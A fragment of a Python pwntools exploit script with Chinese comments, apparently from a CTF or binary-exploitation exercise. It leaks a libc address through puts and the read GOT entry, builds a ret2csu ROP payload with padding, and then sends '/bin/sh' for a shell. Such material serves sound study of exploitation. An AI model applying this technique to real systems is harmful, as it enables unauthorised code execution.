...
puts_addr = elf.plt['puts'] #.plt段对应
read_got = elf.got['read'] #.got.plt段对应
...
io.send(payload)
io.recvuntil('bye~\n')
read_addr = u64(io.recv()[:-1].ljust(8, b'\x00'))
...
payload += b'A'*56		#万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈
payload += p64(start_addr)	#跳转到start，恢复栈
payload = payload.ljust(200, b"B")	#padding

io.send(payload)
io.recvuntil('bye~\n')
io.send(b"/bin/sh\x00")		#上面的一段payload调用了read函数读取"/bin/sh\x00"，这里发送字符串
